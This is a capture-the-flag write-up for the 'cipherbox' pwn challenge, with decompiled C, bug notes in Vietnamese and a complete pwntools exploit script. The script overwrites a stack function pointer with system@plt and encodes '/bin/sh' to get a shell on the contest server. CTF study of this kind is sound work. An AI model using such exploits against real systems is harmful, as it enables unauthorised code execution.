### file info:
```c
└─$ file cipherbox           
cipherbox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=879cab16e94bf921b9dba518ae0ad6fb665b4293, for GNU/Linux 3.2.0, not stripped
```
```d
┌──(kali㉿kali)-[~/KCSCTF/pwn/cypherbox/chall]
└─$ checksec --file=cipherbox
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH       Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   58 Symbols         No    0               3               cipherbox       
```
### code:
`main()`:
```c
undefined8 main(void)
{
  undefined4 option;
  undefined1 buffer [32];
  code *print_hex;
  code *session_done;
  byte abStack_98 [140];
  int i;
  
  setup();
  puts("CipherBox Pro v3.1 - Byte Encoder\n");
  memset(buffer,0,184);
  printf("Name: ");
  readstr(buffer,32);
  print_hex = ::print_hex;
  session_done = ::session_done;
  for (i = 0; i < 128; i = i + 1) {
    abStack_98[i] = (byte)i ^ 0x5a;
  }
  printf("[+] \'%s\' ready.\n\n",buffer);
  do {
    puts("[1]set [2]get [3]encode [4]reset [5]dump [0]quit");
    printf(">> ");
    option = readint();
    switch(option) {
    case 0:
      (*session_done)();
      return 0;
    case 1:
      do_set(buffer);
      break;
    case 2:
      do_get(buffer);
      break;
    case 3:
      do_encode(buffer);
      break;
    case 4:
      do_reset(buffer);
      break;
    case 5:
      do_dump(buffer);
      break;
    default:
      puts("  [-] Invalid option");
    }
  } while( true );
}
```
* bug: `print_hex = ::print_hex;` có thể bị overwrite trên stack
```c

void print_hex(long buf,ulong len)

{
  ulong i;
  
  for (i = 0; i < len; i = i + 1) {
    printf("%02x ",(ulong)*(byte *)(i + buf));
  }
  putchar(10);
  return;
}
```
```c
void do_set(undefined8 buffer)
{
  int val1;
  int val2;
  
  printf("  From (0-255): ");
  val1 = readint();
  printf("  To   (0-255): ");
  val2 = readint();
  if ((((val1 < 0) || (255 < val1)) || (val2 < 0)) || (255 < val2)) {
    puts("  [-] Invalid byte value");
  }
  else {
    set_mapping(buffer,(int)(char)val1,(int)(char)val2);
    puts("  [+] Updated");
  }
  return;
}
```
* bug: cho phép overwrite giá trị của 2 functions (print_hex, session_done) trên stack
```c
void do_get(undefined8 buffer)
{
  byte val1;
  uint val2;
  
  printf("  Byte (0-255): ");
  val2 = readint();
  if (((int)val2 < 0) || (255 < (int)val2)) {
    puts("  [-] Invalid byte value");
  }
  else {
    val1 = get_mapping(buffer,(int)(char)val2);
    printf("  [*] table[%d] = 0x%02x\n",(ulong)val2,(ulong)val1);
  }
  return;
}
```
```c
void do_encode(long buffer)
{
  undefined1 buf [256];
  byte text [256];
  size_t len;
  ulong i;
  
  printf("  Text: ");
  readstr(text,0x100);
  len = strlen((char *)text);
  if (len == 0) {
    puts("  [-] Empty input");
  }
  else {
    for (i = 0; i < len; i = i + 1) {
      buf[i] = *(undefined1 *)(buffer + 0x30 + (long)(int)(uint)text[i]);
    }
    buf[len] = 0;
    *(int *)(buffer + 176) = *(int *)(buffer + 176) + 1;
    printf("  [+] ");
    (**(code **)(buffer + 0x20))(buf,len);
  }
  return;
}
```
* bug: thực thi code, gọi đến hàm `print_hex` với tham số là userinput  
  ```c
  (**(code **)(buffer + 0x20))(buf,len);
  ````
```c
void do_reset(long buffer)
{
  int option;
  uint key;
  int j;
  int i;
  
  puts("  1 - Identity   2 - XOR");
  printf("  Mode: ");
  option = readint();
  if (option == 1) {
    for (i = 0; i < 0x80; i = i + 1) {
      *(char *)(buffer + 0x30 + (long)i) = (char)i;
    }
    puts("  [+] Identity table set");
  }
  else if (option == 2) {
    printf("  Key (0-255): ");
    key = readint();
    if (((int)key < 0) || (0xff < (int)key)) {
      puts("  [-] Invalid key");
    }
    else {
      for (j = 0; j < 0x80; j = j + 1) {
        *(byte *)(buffer + 0x30 + (long)j) = (byte)key ^ (byte)j;
      }
      printf("  [+] XOR(0x%02x) table set\n",(ulong)key);
    }
  }
  else {
    puts("  [-] Unknown mode");
  }
  return;
}
```
* bug: option `1. Identity`, dùng để dựng chuỗi `/bin/sh` ở hàm `do_encode()`
```c
void do_dump(long buffer)
{
  int j;
  int i;
  
  for (i = 0; i < 8; i = i + 1) {
    printf("  %02x: ",(ulong)(uint)(i << 4));
    for (j = 0; j < 16; j = j + 1) {
      printf("%02x ",(ulong)*(byte *)(buffer + 0x30 + (long)(j + i * 0x10)));
    }
    putchar(10);
  }
  return;
}
```
___
### Exploit:

<img width="656" height="440" alt="image" src="https://github.com/user-attachments/assets/0535c159-ddfd-492e-a6ae-84cb3f898eff" />

<img width="668" height="267" alt="image" src="https://github.com/user-attachments/assets/49de13be-8712-4dc1-8992-48d8b77b30d5" />

___ 
Script: `script.py`
```python
from pwn import *

context.binary = exe = ELF("./cipherbox", checksec=False)
# context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br *main+100
		br *main+121
		br *main+192

		br *do_encode
		br *do_encode+279
		''')

def do_set(pos, val):
	p.sendlineafter(b">> ", b"1")
	p.sendlineafter(b"(0-255): ", str(pos))
	p.sendlineafter(b"(0-255): ", str(val))

def do_get(idx):
	p.sendlineafter(b">> ", b"2")
	p.sendlineafter(b"(0-255): ", str(idx))

def do_encode(text):
	p.sendlineafter(b">> ", b"3")
	p.sendlineafter(b"Text: ", text)

def do_reset():
	p.sendlineafter(b">> ", b"4")
	p.sendlineafter(b"Mode: ", b"1")

#nc 67.223.119.69 3647
p = remote("67.223.119.69", 3647)
# p = process(exe.path)
# GDB()

system_plt = p64(0x0000000000401110)

p.sendlineafter(b"Name: ", b"Long")

# overwrite tu 247 - 240
do_set(247, 0)
do_set(246, 0)
do_set(245, 0)
do_set(244, 0)
do_set(243, 0)
do_set(242, 64)
do_set(241, 17)
do_set(240, 16)

do_reset()

# hex = {0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68}
# i = 0x2F
# print(f"character at {i}: {str(do_get(i))}")

#/bin/sh\00
do_encode(b"\x2F\x62\x69\x6E\x2F\x73\x68")

p.interactive()
```
